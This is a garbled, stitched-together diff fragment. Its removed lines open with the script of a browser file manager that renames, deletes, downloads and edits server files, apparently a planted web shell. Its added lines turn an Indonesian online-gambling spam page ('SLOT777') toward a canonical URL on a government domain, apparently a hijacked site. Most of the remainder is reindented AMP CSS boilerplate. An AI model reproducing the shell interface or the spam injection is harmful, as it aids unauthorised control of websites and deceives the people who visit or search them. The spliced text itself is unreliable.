-			hiddenInput.value = name;
-			hiddenInput.name = "oldname";
-			document.getElementById("rename-form").appendChild(hiddenInput);
-			
-			modalBodyInput.value = name
-		})
-		
-		deleteModal.addEventListener('show.bs.modal', function (event) {
-			var button = event.relatedTarget
-			var file = button.getAttribute('data-bs-file')
-			var deleteConfirm = document.getElementById('delete-confirm')
-			deleteConfirm.href = '?dir=' + file + '&do=delete'
-		})
-		
-		downloadModal.addEventListener('show.bs.modal', function (event) {
-			var button = event.relatedTarget
-			var file = button.getAttribute('data-bs-file')
-			var downloadConfirm = document.getElementById('download-confirm')
-			downloadConfirm.href = '?dir=' + file + '&do=download'
-		})
-		
-		viewModal.addEventListener('show.bs.modal', function (event) {
-			var button = event.relatedTarget
-			var content = button.getAttribute('data-bs-content')
-			var name = button.getAttribute('data-bs-name')
-			var modalTitle = viewModal.querySelector('.modal-title')
-			var modalContent = viewModal.querySelector('.modal-body textarea')
-			var hiddenInput = document.createElement('input')
-			hiddenInput.type = "hidden";
-			hiddenInput.value = name;
-			hiddenInput.name = "filename";
-			viewModal.querySelector("form").appendChild(hiddenInput);
-
-			modalTitle.textContent = 'Edit ' + name
-			modalContent.value = content
-		})
-	</script>
-</body>
-</html>lot Online Paling Gacor Terbaik Hari Ini</title>
-    <meta name="description" content="Slot hoki memberikan pelayanan slot online dengan beraneka ragam permaianan dari provider slot resmi dan terlengkap, daftar segera di situs slot gacor." />
-    <meta name="keywords" content="slot hoki, situs slot terpercaya, situs slot gacor, judi online, situs slot judi, slot online, situs judi, slot gacor terbaik, slot jackpot terbesar, slot gacor, slot terpercaya, slot deposit pulsa, akun judi slot, slot online maxwin, slot gacor hari ini" />
-    <link itemprop="mainEntityOfPage" rel="canonical" href="https://micocar.com/slot-hoki/" />
-    <link href="https://micocar.com/slot-hoki/" rel="dns-prefetch">
+    <title>SLOT777 Link Situs Slot Gacor Hari Ini 2022 Terbaru Auto Maxwin</title>
+    <meta name="google-site-verification" content="UROYMCeWD08IEDYhUS0ujD7dPKyhWBTben3yVlrWiSE" />
+    <meta name="description" content="SLOT777 Adalah sebuah link situs slot gacor hari ini yang dimana anda bisa memainkan game slot online uang asli untuk mendapatkan slot gacor maxwin di situs slot gacor 2022 terpercaya di Indonesia yaitu SLOT777" />
+    <meta name="keywords" content="judi slot online, situs slot online terpercaya, situs slot online, slot online terpercaya, slot online, slot online gacor, slot gacor, slot resmi, slot, situs slot, situs slot gacor 2022 terpercaya, slot gacor 2022, SLOT777" />
+    <link itemprop="mainEntityOfPage" rel="canonical" href="https://jdih.gunungsitolikota.go.id/slot-gacor/" />
     <meta name="robots" content="index, follow" />
     <meta name="page-locale" content="id,en">
-    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
     <meta content="true" name="HandheldFriendly">
     <meta content="width" name="MobileOptimized">
     <meta content="indonesian" name="language">
     <meta content='#007fa0' name='theme-color' />
-    <link rel="preload" as="image" href="https://i.ibb.co/BBDXvyJ/slot-hoki.jpg" />
+    <link rel="preload" as="image" href="https://i.postimg.cc/RCJyPq5G/image.png" />
     <meta name="supported-amp-formats" content="websites,stories,ads,email">
-    <meta name="google-site-verification" content="FDXAGeOLKwUCz7QzuGAnWEUvKYAx1a8hg9JKKKGzRnE" />
     <!-- Twitter -->
     <meta name="twitter:card" content="summary">
-    <meta name="twitter:title" content="Slot Hoki: Situs Judi Slot Online Paling Gacor Terbaik Hari Ini">
-    <meta name="twitter:description" content="Slot hoki memberikan pelayanan slot online dengan beraneka ragam permaianan dari provider slot resmi dan terlengkap, daftar segera di situs slot gacor.">
-    <meta name="twitter:image:src" content="https://i.ibb.co/BBDXvyJ/slot-hoki.jpg">
-    <meta name="og:title" content="Slot Hoki: Situs Judi Slot Online Paling Gacor Terbaik Hari Ini">
-    <meta name="og:description" content="Slot hoki memberikan pelayanan slot online dengan beraneka ragam permaianan dari provider slot resmi dan terlengkap, daftar segera di situs slot gacor.">
-    <meta name="og:image" content="https://i.ibb.co/hYWG2Fk/slot-hoki.png">
+    <meta name="twitter:title" content="SLOT777 Link Situs Slot Gacor Hari Ini 2022 Terbaru Auto Maxwin">
+    <meta name="twitter:description" content="SLOT777 Adalah sebuah link situs slot gacor hari ini yang dimana anda bisa memainkan game slot online uang asli untuk mendapatkan slot gacor maxwin di situs slot gacor 2022 terpercaya di Indonesia yaitu SLOT777">
+    <meta name="twitter:image:src" content="https://i.postimg.cc/RCJyPq5G/image.png">
+    <meta name="twitter:player" content="https://www.youtube.com/watch?v=kO1vri_Jd2o">
+    <meta name="og:title" content="SLOT777 Link Situs Slot Gacor Hari Ini 2022 Terbaru Auto Maxwin">
+    <meta name="og:description" content="SLOT777 Adalah sebuah link situs slot gacor hari ini yang dimana anda bisa memainkan game slot online uang asli untuk mendapatkan slot gacor maxwin di situs slot gacor 2022 terpercaya di Indonesia yaitu SLOT777">
+    <meta name="og:image" content="https://i.postimg.cc/RCJyPq5G/image.png">
     <meta property="og:image:width" content="600">
     <meta property="og:image:height" content="466">
-    <meta name="og:url" content="https://micocar.com/slot-hoki/">
-    <meta name="og:site_name" content="slot hoki">
+    <meta name="og:url" content="https://jdih.gunungsitolikota.go.id/slot-gacor/">
+    <meta name="og:site_name" content="SLOT777">
     <meta name="og:locale" content="ID_id">
+    <meta name="og:video" content="https://www.youtube.com/watch?v=kO1vri_Jd2o">
     <meta name="og:type" content="website">
     <meta property="og:type" content="video" />
     <meta property="og:video:type" content="video/mp4">
     <meta property="og:video:width" content="500">
     <meta property="og:video:height" content="281">
     <meta name="theme-color" content="#0a0a0a" />
-    <meta name="categories" content="slot hoki, situs slot terpercaya, situs slot gacor, judi online, situs slot judi, slot online, situs judi, slot hoki terbaik, slot jackpot terbesar, slot gacor, slot terpercaya, slot deposit pulsa, akun judi slot, slot online maxwin, slot gacor hari ini" />
+    <meta name="categories" content="Slot Gacor" />
     <meta name="language" content="ID">
     <meta name="rating" content="general">
-    <meta name="copyright" content="slot hoki">
-    <meta name="author" content="slot hoki">
+    <meta name="copyright" content="SLOT777">
+    <meta name="author" content="SLOT777">
     <meta name="distribution" content="global">
-    <meta name="publisher" content="slot hoki">
+    <meta name="publisher" content="SLOT777">
     <meta name="geo.placename" content="DKI Jakarta">
     <meta name="geo.country" content="ID">
     <meta name="geo.region" content="ID" />
     <meta name="tgn.nation" content="Indonesia">
-    <link rel="shortcut icon" type="image/x-icon" href="https://i.ibb.co/hYWG2Fk/slot-hoki.png" />
-    <link href='https://i.ibb.co/hYWG2Fk/slot-hoki.png' rel='icon' sizes='32x32' type='image/png' />
+    <link rel="shortcut icon" type="image/x-icon" href="https://i.postimg.cc/J0tmpS3G/slot-gacor.png" />
+    <link href='https://i.postimg.cc/J0tmpS3G/slot-gacor.png' rel='icon' sizes='32x32' type='image/png' />
     <style amp-runtime i-amphtml-version="012107240354000">
-      html.i-amphtml-fie {
-        height: 100% !important;
-        width: 100% !important
-      }
+        html.i-amphtml-fie {
+          height: 100% !important;
+          width: 100% !important
+        }
+  
+        html:not([amp4ads]),
+        html:not([amp4ads]) body {
+          height: auto !important
 
-      html:not([amp4ads]),
-      html:not([amp4ads]) body {
-        height: auto !important
-      }
-
-      html:not([amp4ads]) body {
-        margin: 0 !important
-      }
-
-      body {
-        -webkit-text-size-adjust: 100%;
-        -moz-text-size-adjust: 100%;
-        -ms-text-size-adjust: 100%;
-        text-size-adjust: 100%
-      }
-
-      html.i-amphtml-singledoc.i-amphtml-embedded {
-        -ms-touch-action: pan-y pinch-zoom;
-        touch-action: pan-y pinch-zoom
-      }
-
-      html.i-amphtml-fie>body,
-      html.i-amphtml-singledoc>body {
-        overflow: visible !important
-      }
-
-      html.i-amphtml-fie:not(.i-amphtml-inabox)>body,
-      html.i-amphtml-singledoc:not(.i-amphtml-inabox)>body {
-        position: relative !important
-      }
-
-      html.i-amphtml-ios-embed-legacy>body {
-        overflow-x: hidden !important;
-        overflow-y: auto !important;
-        position: absolute !important
-      }
-
-      html.i-amphtml-ios-embed {
-        overflow-y: auto !important;
-        position: static
-      }
-
-      #i-amphtml-wrapper {
-        overflow-x: hidden !important;
-        overflow-y: auto !important;
-        position: absolute !important;
-        top: 0 !important;
-        left: 0 !important;
-        right: 0 !important;
-        bottom: 0 !important;
-        margin: 0 !important;
-        display: block !important
-      }
-
-      html.i-amphtml-ios-embed.i-amphtml-ios-overscroll,
-      html.i-amphtml-ios-embed.i-amphtml-ios-overscroll>#i-amphtml-wrapper {
-        -webkit-overflow-scrolling: touch !important
-      }
-
-      #i-amphtml-wrapper>body {
-        position: relative !important;
-        border-top: 1px solid transparent !important
-      }
-
-      #i-amphtml-wrapper+body {
-        visibility: visible
-      }
-
-      #i-amphtml-wrapper+body .i-amphtml-lightbox-element,
-      #i-amphtml-wrapper+body[i-amphtml-lightbox] {
-        visibility: hidden
-      }
-
-      #i-amphtml-wrapper+body[i-amphtml-lightbox] .i-amphtml-lightbox-element {
-        visibility: visible
-      }
-
-      #i-amphtml-wrapper.i-amphtml-scroll-disabled,
-      .i-amphtml-scroll-disabled {
-        overflow-x: hidden !important;
-        overflow-y: hidden !important
-      }
-
-      amp-instagram {
-        padding: 54px 0 0 !important;
-        background-color: #fff
-      }
-
-      amp-iframe iframe {
-        box-sizing: border-box !important
-      }
-
-      [amp-access][amp-access-hide] {
-        display: none
-      }
-
-      [subscriptions-dialog],
-      body:not(.i-amphtml-subs-ready) [subscriptions-action],
-      body:not(.i-amphtml-subs-ready) [subscriptions-section] {
-        display: none !important
-      }
-
-      amp-experiment,
-      amp-live-list>[update] {
-        display: none
-      }
-
-      amp-list[resizable-children]>.i-amphtml-loading-container.amp-hidden {
-        display: none !important
-      }
-
-      amp-list [fetch-error],
-      amp-list[load-more] [load-more-button],
-      amp-list[load-more] [load-more-end],
-      amp-list[load-more] [load-more-failed],
-      amp-list[load-more] [load-more-loading] {
-        display: none
-      }
-
-      amp-list[diffable] div[role="list"] {
-        display: block
-      }
-
-      amp-story-page,
-      amp-story[standalone] {
-        min-height: 1px !important;
-        display: block !important;
-        height: 100% !important;
-        margin: 0 !important;
-        padding: 0 !important;
-        overflow: hidden !important;
-        width: 100% !important
-      }
-
-      amp-story[standalone] {
-        background-color: #202125 !important;
-        position: relative !important
-      }
-
-      amp-story-page {
-        background-color: #757575
-      }
-
-      amp-story .amp-active>div,
-      amp-story .i-amphtml-loader-background {
-        display: none !important
-      }
-
-      amp-story-page:not(:first-of-type):not([distance]):not([active]) {
-        transform: translateY(1000vh) !important
-      }
-
-      amp-autocomplete {
-        position: relative !important;
-        display: inline-block !important
-      }
-
-      amp-autocomplete>input,
-      amp-autocomplete>textarea {
-        padding: .5rem;
-        border: 1px solid rgba(0, 0, 0, .33)
-      }
-
-      .i-amphtml-autocomplete-results,
-      amp-autocomplete>input,
-      amp-autocomplete>textarea {
-        font-size: 1rem;
-        line-height: 1.5rem
-      }
-
-      [amp-fx^="fly-in"] {
-        visibility: hidden
-      }
-
-      amp-script[nodom],
-      amp-script[sandboxed] {
-        position: fixed !important;
-        top: 0 !important;
-        width: 1px !important;
-        height: 1px !important;
-        overflow: hidden !important;
-        visibility: hidden
-      }
-
-      [hidden] {
-        display: none !important
-      }
-
-      .i-amphtml-element {
-        display: inline-block
-      }
-
-      .i-amphtml-blurry-placeholder {
-        transition: opacity .3s cubic-bezier(0, 0, .2, 1) !important;
-        pointer-events: none
-      }
-
-      [layout=nodisplay]:not(.i-amphtml-element) {
-        display: none !important
-      }
-
-      .i-amphtml-layout-fixed,
-      [layout=fixed][width][height]:not(.i-amphtml-layout-fixed) {
-        display: inline-block;
-        position: relative
-      }
-
-      .i-amphtml-layout-responsive,
-      [layout=responsive][width][height]:not(.i-amphtml-layout-responsive),
-      [width][height][heights]:not([layout]):not(.i-amphtml-layout-responsive),
-      [width][height][sizes]:not(img):not([layout]):not(.i-amphtml-layout-responsive) {
-        display: block;
-        position: relative
-      }
-
-      .i-amphtml-layout-intrinsic,
-      [layout=intrinsic][width][height]:not(.i-amphtml-layout-intrinsic) {
-        display: inline-block;
-        position: relative;
-        max-width: 100%
-      }
-
-      .i-amphtml-layout-intrinsic .i-amphtml-sizer {
-        max-width: 100%
-      }
-
-      .i-amphtml-intrinsic-sizer {
-        max-width: 100%;
-        display: block !important
-      }
-
-      .i-amphtml-layout-container,
-      .i-amphtml-layout-fixed-height,
-      [layout=container],
-      [layout=fixed-height][height]:not(.i-amphtml-layout-fixed-height) {
-        display: block;
-        position: relative
-      }
-
-      .i-amphtml-layout-fill,
-      .i-amphtml-layout-fill.i-amphtml-notbuilt,
-      [layout=fill]:not(.i-amphtml-layout-fill),
-      body noscript>* {
-        display: block;
-        overflow: hidden !important;
-        position: absolute;
-        top: 0;
-        left: 0;
-        bottom: 0;
-        right: 0
-      }
-
-      body noscript>* {
-        position: absolute !important;
-        width: 100%;
-        height: 100%;
-        z-index: 2
-      }
-
-      body noscript {
-        display: inline !important
-      }
-
-      .i-amphtml-layout-flex-item,
-      [layout=flex-item]:not(.i-amphtml-layout-flex-item) {
-        display: block;
-        position: relative;
-        -ms-flex: 1 1 auto;
-        flex: 1 1 auto
-      }
-
-      .i-amphtml-layout-fluid {
-        position: relative
-      }
-
-      .i-amphtml-layout-size-defined {
-        overflow: hidden !important
-      }
-
-      .i-amphtml-layout-awaiting-size {
-        position: absolute !important;
-        top: auto !important;
-        bottom: auto !important
-      }
-
-      i-amphtml-sizer {
-        display: block !important
-      }
-
-      @supports (aspect-ratio:1/1) {
-        i-amphtml-sizer.i-amphtml-disable-ar {
+        }
+  
+        html:not([amp4ads]) body {
+          margin: 0 !important
+        }
+  
+        body {
+          -webkit-text-size-adjust: 100%;
+          -moz-text-size-adjust: 100%;
+          -ms-text-size-adjust: 100%;
+          text-size-adjust: 100%
+        }
+  
+        html.i-amphtml-singledoc.i-amphtml-embedded {
+          -ms-touch-action: pan-y pinch-zoom;
+          touch-action: pan-y pinch-zoom
+        }
+  
+        html.i-amphtml-fie>body,
+        html.i-amphtml-singledoc>body {
+          overflow: visible !important
+        }
+  
+        html.i-amphtml-fie:not(.i-amphtml-inabox)>body,
+        html.i-amphtml-singledoc:not(.i-amphtml-inabox)>body {
+          position: relative !important
+        }
+  
+        html.i-amphtml-ios-embed-legacy>body {
+          overflow-x: hidden !important;
+          overflow-y: auto !important;
+          position: absolute !important
+        }
+  
+        html.i-amphtml-ios-embed {
+          overflow-y: auto !important;
+          position: static
+        }
+  
+        #i-amphtml-wrapper {
+          overflow-x: hidden !important;
+          overflow-y: auto !important;
+          position: absolute !important;
+          top: 0 !important;
+          left: 0 !important;
+          right: 0 !important;
+          bottom: 0 !important;
+          margin: 0 !important;
+          display: block !important
+        }
+  
+        html.i-amphtml-ios-embed.i-amphtml-ios-overscroll,
+        html.i-amphtml-ios-embed.i-amphtml-ios-overscroll>#i-amphtml-wrapper {
+          -webkit-overflow-scrolling: touch !important
+        }
+  
+        #i-amphtml-wrapper>body {
+          position: relative !important;
+          border-top: 1px solid transparent !important
+        }
+  
+        #i-amphtml-wrapper+body {
+          visibility: visible
+        }
+  
+        #i-amphtml-wrapper+body .i-amphtml-lightbox-element,
+        #i-amphtml-wrapper+body[i-amphtml-lightbox] {
+          visibility: hidden
+        }
+  
+        #i-amphtml-wrapper+body[i-amphtml-lightbox] .i-amphtml-lightbox-element {
+          visibility: visible
+        }
+  
+        #i-amphtml-wrapper.i-amphtml-scroll-disabled,
+        .i-amphtml-scroll-disabled {
+          overflow-x: hidden !important;
+          overflow-y: hidden !important
+        }
+  
+        amp-instagram {
+          padding: 54px 0 0 !important;
+          background-color: #fff
+        }
+  
+        amp-iframe iframe {
+          box-sizing: border-box !important
+        }
+  
+        [amp-access][amp-access-hide] {
+          display: none
+        }
+  
+        [subscriptions-dialog],
+        body:not(.i-amphtml-subs-ready) [subscriptions-action],
+        body:not(.i-amphtml-subs-ready) [subscriptions-section] {
           display: none !important
         }
-      }
-
-      .i-amphtml-blurry-placeholder,
-      .i-amphtml-fill-content {
-        display: block;
-        height: 0;
-        max-height: 100%;
-        max-width: 100%;
-        min-height: 100%;
-        min-width: 100%;
-        width: 0;
-        margin: auto
-      }
-
-      .i-amphtml-layout-size-defined .i-amphtml-fill-content {
-        position: absolute;
-        top: 0;
-        left: 0;
-        bottom: 0;
-        right: 0
-      }
-
-      .i-amphtml-replaced-content,
-      .i-amphtml-screen-reader {
-        padding: 0 !important;
-        border: none !important
-      }
-
-      .i-amphtml-screen-reader {
-        position: fixed !important;
-        top: 0 !important;
-        left: 0 !important;
-        width: 4px !important;
-        height: 4px !important;
-        opacity: 0 !important;
-        overflow: hidden !important;
-        margin: 0 !important;
-        display: block !important;
-        visibility: visible !important
-      }
-
-      .i-amphtml-screen-reader~.i-amphtml-screen-reader {
-        left: 8px !important
-      }
-
-      .i-amphtml-screen-reader~.i-amphtml-screen-reader~.i-amphtml-screen-reader {
-        left: 12px !important
-      }
-
-      .i-amphtml-screen-reader~.i-amphtml-screen-reader~.i-amphtml-screen-reader~.i-amphtml-screen-reader {
-        left: 16px !important
-      }
-
-      .i-amphtml-unresolved {
-        position: relative;
-        overflow: hidden !important
-      }
-
-      .i-amphtml-select-disabled {
-        -webkit-user-select: none !important;
-        -ms-user-select: none !important;
-        user-select: none !important
-      }
-
-      .i-amphtml-notbuilt,
-      [layout]:not(.i-amphtml-element),
-      [width][height][heights]:not([layout]):not(.i-amphtml-element),
-      [width][height][sizes]:not(img):not([layout]):not(.i-amphtml-element) {
-        position: relative;
-        overflow: hidden !important;
-        color: transparent !important
-      }
-
-      .i-amphtml-notbuilt:not(.i-amphtml-layout-container)>*,
-      [layout]:not([layout=container]):not(.i-amphtml-element)>*,
-      [width][height][heights]:not([layout]):not(.i-amphtml-element)>*,
-      [width][height][sizes]:not([layout]):not(.i-amphtml-element)>* {
-        display: none
-      }
-
-      amp-img:not(.i-amphtml-element)[i-amphtml-ssr]>img.i-amphtml-fill-content {
-        display: block
-      }
-
-      .i-amphtml-notbuilt:not(.i-amphtml-layout-container),
-      [layout]:not([layout=container]):not(.i-amphtml-element),
-      [width][height][heights]:not([layout]):not(.i-amphtml-element),
-      [width][height][sizes]:not(img):not([layout]):not(.i-amphtml-element) {
-        color: transparent !important;
-        line-height: 0 !important
-      }
-
-      .i-amphtml-ghost {
-        visibility: hidden !important
-      }
-
-      .i-amphtml-element>[placeholder],
-      [layout]:not(.i-amphtml-element)>[placeholder],
-      [width][height][heights]:not([layout]):not(.i-amphtml-element)>[placeholder],
-      [width][height][sizes]:not([layout]):not(.i-amphtml-element)>[placeholder] {
-        display: block;
-        line-height: normal
-      }
-
-      .i-amphtml-element>[placeholder].amp-hidden,
-      .i-amphtml-element>[placeholder].hidden {
-        visibility: hidden
-      }
-
-      .i-amphtml-element:not(.amp-notsupported)>[fallback],
-      .i-amphtml-layout-container>[placeholder].amp-hidden,
-      .i-amphtml-layout-container>[placeholder].hidden {
-        display: none
-      }
-
-      .i-amphtml-layout-size-defined>[fallback],
-      .i-amphtml-layout-size-defined>[placeholder] {
-        position: absolute !important;
-        top: 0 !important;
-        left: 0 !important;
-        right: 0 !important;
-        bottom: 0 !important;
-        z-index: 1
-      }
-
-      amp-img.i-amphtml-ssr:not(.i-amphtml-element)>[placeholder] {
-        z-index: auto
-      }
-
-      .i-amphtml-notbuilt>[placeholder] {
-        display: block !important
-      }
-
-      .i-amphtml-hidden-by-media-query {
-        display: none !important
-      }
-
-      .i-amphtml-element-error {
-        background: green !important;
-        color: #fff !important;
-        position: relative !important
-      }
-
-      .i-amphtml-element-error:before {
-        content: attr(error-message)
-      }
-
-      i-amp-scroll-container,
-      i-amphtml-scroll-container {
-        position: absolute;
-        top: 0;
-        left: 0;
-        right: 0;
-        bottom: 0;
-        display: block
-      }
-
-      i-amp-scroll-container.amp-active,
-      i-amphtml-scroll-container.amp-active {
-        overflow: auto;
-        -webkit-overflow-scrolling: touch
-      }
-
-      .i-amphtml-loading-container {
-        display: block !important;
-        pointer-events: none;
-        z-index: 1
-      }
-
-      .i-amphtml-notbuilt>.i-amphtml-loading-container {
-        display: block !important
-      }
-
-      .i-amphtml-loading-container.amp-hidden {
-        visibility: hidden
-      }
-
-      .i-amphtml-element>[overflow] {
-        cursor: pointer;
-        position: relative;
-        z-index: 2;
-        visibility: hidden;
-        display: initial;
-        line-height: normal
-      }
-
-      .i-amphtml-layout-size-defined>[overflow] {
-        position: absolute
-      }
-
-      .i-amphtml-element>[overflow].amp-visible {
-        visibility: visible
-      }
-
-      template {
-        display: none !important
-      }
-
-      .amp-border-box,
-      .amp-border-box *,
-      .amp-border-box :after,
-      .amp-border-box :before {
-        box-sizing: border-box
-      }
-
-      amp-pixel {
-        display: none !important
-      }
-
-      amp-analytics,
-      amp-auto-ads,
-      amp-story-auto-ads {
-        position: fixed !important;
-        top: 0 !important;
-        width: 1px !important;
-        height: 1px !important;
-        overflow: hidden !important;
-        visibility: hidden
-      }
-
-      html.i-amphtml-fie>amp-analytics {
-        position: initial !important
-      }
-
-      [visible-when-invalid]:not(.visible),
-      form [submit-error],
-      form [submit-success],
-      form [submitting] {
-        display: none
-      }
-
-      amp-accordion {
-        display: block !important
-      }
-
-      @media (min-width:1px) {
-        :where(amp-accordion>section)>:first-child {
-          margin: 0;
-          background-color: #efefef;
-          padding-right: 20px;
-          border: 1px solid #dfdfdf
+  
+        amp-experiment,
+        amp-live-list>[update] {
+          display: none
         }
-
-        :where(amp-accordion>section)>:last-child {
+  
+        amp-list[resizable-children]>.i-amphtml-loading-container.amp-hidden {
+          display: none !important
+        }
+  
+        amp-list [fetch-error],
+        amp-list[load-more] [load-more-button],
+        amp-list[load-more] [load-more-end],
+        amp-list[load-more] [load-more-failed],
+        amp-list[load-more] [load-more-loading] {
+          display: none
+        }
+  
+        amp-list[diffable] div[role="list"] {
+          display: block
+        }
+  
+        amp-story-page,
+        amp-story[standalone] {
+          min-height: 1px !important;
+          display: block !important;
+          height: 100% !important;
+          margin: 0 !important;
+          padding: 0 !important;
+          overflow: hidden !important;
+          width: 100% !important
+        }
+  
+        amp-story[standalone] {
+          background-color: #202125 !important;
+          position: relative !important
+        }
+  
+        amp-story-page {
+          background-color: #757575
+        }
+  
+        amp-story .amp-active>div,
+        amp-story .i-amphtml-loader-background {
+          display: none !important
+        }
+  
+        amp-story-page:not(:first-of-type):not([distance]):not([active]) {
+          transform: translateY(1000vh) !important
+        }amp-autocomplete {
+          position: relative !important;
+          display: inline-block !important
+        }
+  
+        amp-autocomplete>input,
+        amp-autocomplete>textarea {
+          padding: .5rem;
+          border: 1px solid rgba(0, 0, 0, .33)
+        }
+  
+        .i-amphtml-autocomplete-results,
+        amp-autocomplete>input,
+        amp-autocomplete>textarea {
+          font-size: 1rem;
+          line-height: 1.5rem
+        }
+  
+        [amp-fx^="fly-in"] {
+          visibility: hidden
+        }
+  
+        amp-script[nodom],
+        amp-script[sandboxed] {
+          position: fixed !important;
+          top: 0 !important;
+          width: 1px !important;
+          height: 1px !important;
+          overflow: hidden !important;
+          visibility: hidden
+        }
+  
+        [hidden] {
+          display: none !important
+        }
+  
+        .i-amphtml-element {
+          display: inline-block
+        }
+  
+        .i-amphtml-blurry-placeholder {
+          transition: opacity .3s cubic-bezier(0, 0, .2, 1) !important;
+          pointer-events: none
+        }
+  
+        [layout=nodisplay]:not(.i-amphtml-element) {
+          display: none !important
+        }
+  
+        .i-amphtml-layout-fixed,
+        [layout=fixed][width][height]:not(.i-amphtml-layout-fixed) {
+          display: inline-block;
+          position: relative
+        }
+  
+        .i-amphtml-layout-responsive,
+        [layout=responsive][width][height]:not(.i-amphtml-layout-responsive),
+        [width][height][heights]:not([layout]):not(.i-amphtml-layout-responsive),
+        [width][height][sizes]:not(img):not([layout]):not(.i-amphtml-layout-responsive) {
+          display: block;
+          position: relative
+        }
+  
+        .i-amphtml-layout-intrinsic,
+        [layout=intrinsic][width][height]:not(.i-amphtml-layout-intrinsic) {
+          display: inline-block;
+          position: relative;
+          max-width: 100%
+        }
+  
+        .i-amphtml-layout-intrinsic .i-amphtml-sizer {
+          max-width: 100%
+        }
+  
+        .i-amphtml-intrinsic-sizer {
+          max-width: 100%;
+          display: block !important
+        }
+  
+        .i-amphtml-layout-container,
+        .i-amphtml-layout-fixed-height,
+        [layout=container],
+        [layout=fixed-height][height]:not(.i-amphtml-layout-fixed-height) {
+          display: block;
+          position: relative
+        }
+  
+        .i-amphtml-layout-fill,
+        .i-amphtml-layout-fill.i-amphtml-notbuilt,
+        [layout=fill]:not(.i-amphtml-layout-fill),
+        body noscript>* {
+          display: block;
+          overflow: hidden !important;
+          position: absolute;
+          top: 0;
+          left: 0;
+          bottom: 0;
+          right: 0
+        }
+  
+        body noscript>* {
+          position: absolute !important;
+          width: 100%;
+          height: 100%;
+          z-index: 2
+        }
+  
+        body noscript {
+          display: inline !important
+        }
+  
+        .i-amphtml-layout-flex-item,
+        [layout=flex-item]:not(.i-amphtml-layout-flex-item) {
+          display: block;
+          position: relative;
+          -ms-flex: 1 1 auto;
+          flex: 1 1 auto
+        }
+  
+        .i-amphtml-layout-fluid {
+          position: relative
+        }
+  
+        .i-amphtml-layout-size-defined {
+          overflow: hidden !important
+        }
+  
+        .i-amphtml-layout-awaiting-size {
+          position: absolute !important;
+          top: auto !important;
+          bottom: auto !important
+        }
+  
+        i-amphtml-sizer {
+          display: block !important
+        }
+  
+        @supports (aspect-ratio:1/1) {
+          i-amphtml-sizer.i-amphtml-disable-ar {
+            display: none !important
+          }
+        }
+  
+        .i-amphtml-blurry-placeholder,
+        .i-amphtml-fill-content {
+          display: block;
+          height: 0;
+          max-height: 100%;
+          max-width: 100%;
+          min-height: 100%;
+          min-width: 100%;
+          width: 0;
+          margin: auto
+        }
+  
+        .i-amphtml-layout-size-defined .i-amphtml-fill-content {
+          position: absolute;
+          top: 0;
+          left: 0;
+          bottom: 0;
+          right: 0
+        }
+  
+        .i-amphtml-replaced-content,
+        .i-amphtml-screen-reader {
+          padding: 0 !important;
+          border: none !important
+        }
+  
+        .i-amphtml-screen-reader {
+          position: fixed !important;
+          top: 0 !important;
+          left: 0 !important;
+          width: 4px !important;
+          height: 4px !important;
+          opacity: 0 !important;
+          overflow: hidden !important;
+          margin: 0 !important;
+          display: block !important;
+          visibility: visible !important
+        }
+  
+        .i-amphtml-screen-reader~.i-amphtml-screen-reader {
+          left: 8px !important
+        }
+  
+        .i-amphtml-screen-reader~.i-amphtml-screen-reader~.i-amphtml-screen-reader {
+          left: 12px !important
+        }
+  
+        .i-amphtml-screen-reader~.i-amphtml-screen-reader~.i-amphtml-screen-reader~.i-amphtml-screen-reader {
+          left: 16px !important
+        }
+  
+        .i-amphtml-unresolved {
+          position: relative;
+          overflow: hidden !important
+        }
+  
+        .i-amphtml-select-disabled {
+          -webkit-user-select: none !important;
+          -ms-user-select: none !important;
+          user-select: none !important
+        }
+  
+        .i-amphtml-notbuilt,
+        [layout]:not(.i-amphtml-element),
+        [width][height][heights]:not([layout]):not(.i-amphtml-element),
+        [width][height][sizes]:not(img):not([layout]):not(.i-amphtml-element) {
+          position: relative;
+          overflow: hidden !important;
+          color: transparent !important
+        }
+  
+        .i-amphtml-notbuilt:not(.i-amphtml-layout-container)>*,
+        [layout]:not([layout=container]):not(.i-amphtml-element)>*,
+        [width][height][heights]:not([layout]):not(.i-amphtml-element)>*,
+        [width][height][sizes]:not([layout]):not(.i-amphtml-element)>* {
+          display: none
+        }
+  
+        amp-img:not(.i-amphtml-element)[i-amphtml-ssr]>img.i-amphtml-fill-content {
+          display: block
+        }
+  
+        .i-amphtml-notbuilt:not(.i-amphtml-layout-container),
+        [layout]:not([layout=container]):not(.i-amphtml-element),
+        [width][height][heights]:not([layout]):not(.i-amphtml-element),
+        [width][height][sizes]:not(img):not([layout]):not(.i-amphtml-element) {
+          color: transparent !important;
+          line-height: 0 !important
+        }
+  
+        .i-amphtml-ghost {
+          visibility: hidden !important
+        }
+  
+        .i-amphtml-element>[placeholder],
+        [layout]:not(.i-amphtml-element)>[placeholder],
+        [width][height][heights]:not([layout]):not(.i-amphtml-element)>[placeholder],
+        [width][height][sizes]:not([layout]):not(.i-amphtml-element)>[placeholder] {
+          display: block;
+          line-height: normal
+        }
+  
+        .i-amphtml-element>[placeholder].amp-hidden,
+        .i-amphtml-element>[placeholder].hidden {
+          visibility: hidden
+        }
+  
+        .i-amphtml-element:not(.amp-notsupported)>[fallback],
+        .i-amphtml-layout-container>[placeholder].amp-hidden,
+        .i-amphtml-layout-container>[placeholder].hidden {
+          display: none
+        }
+  
+        .i-amphtml-layout-size-defined>[fallback],
+        .i-amphtml-layout-size-defined>[placeholder] {
+          position: absolute !important;
+          top: 0 !important;
+          left: 0 !important;
+          right: 0 !important;
+          bottom: 0 !important;
+          z-index: 1
+        }
+  
+        amp-img.i-amphtml-ssr:not(.i-amphtml-element)>[placeholder] {
+          z-index: auto
+        }
+  
+        .i-amphtml-notbuilt>[placeholder] {
+          display: block !important
+        }
+  
+        .i-amphtml-hidden-by-media-query {
+          display: none !important
+        }
+  
+        .i-amphtml-element-error {
+          background: green !important;
+          color: #fff !important;
+          position: relative !important
+        }
+  
+        .i-amphtml-element-error:before {content: attr(error-message)
+        }
+  
+        i-amp-scroll-container,
+        i-amphtml-scroll-container {
+          position: absolute;
+          top: 0;
+          left: 0;
+          right: 0;
+          bottom: 0;
+          display: block
+        }
+  
+        i-amp-scroll-container.amp-active,
+        i-amphtml-scroll-container.amp-active {
+          overflow: auto;
+          -webkit-overflow-scrolling: touch
+        }
+  
+        .i-amphtml-loading-container {
+          display: block !important;
+          pointer-events: none;
+          z-index: 1
+        }
+  
+        .i-amphtml-notbuilt>.i-amphtml-loading-container {
+          display: block !important
+        }
+  
